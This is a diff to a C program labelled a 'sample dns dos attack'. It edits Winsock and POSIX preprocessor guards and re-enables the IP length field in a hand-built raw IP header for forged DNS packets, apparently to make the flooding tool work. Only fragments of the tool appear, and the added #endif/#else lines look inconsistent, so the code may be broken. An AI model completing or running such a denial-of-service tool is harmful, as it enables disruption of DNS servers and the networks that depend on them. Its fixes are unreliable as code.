@@ -25,7 +25,7 @@ sample dns dos attack
 #include <ws2tcpip.h>
 #pragma comment(lib, "ws2_32.lib")
 #else
-
+#endif
 
 
 
@@ -85,9 +85,11 @@ int main(int argc,char **argv)
         SOCKET sockfd;
         WSAStartup (0x101, &W);
         #else
+        #endif
         #ifdef W32_NATIVE
         WSADATA WSAData;
         WSAStartup(MAKEWORD(2, 2), &WSAData);
+        #else
         #endif
 	
         if(argc!=2)
@@ -121,7 +123,7 @@ int main(int argc,char **argv)
 				dns_data.ip.ip_v=4;
 				dns_data.ip.ip_hl=(sizeof(struct ip)/4);
 				dns_data.ip.ip_tos=0;
-				// dns_data.ip.ip_len=sizeof(dns_data);
+				dns_data.ip.ip_len=sizeof(dns_data);
 				dns_data.ip.ip_id=random();
 				dns_data.ip.ip_off=0;
 				dns_data.ip.ip_ttl=255;
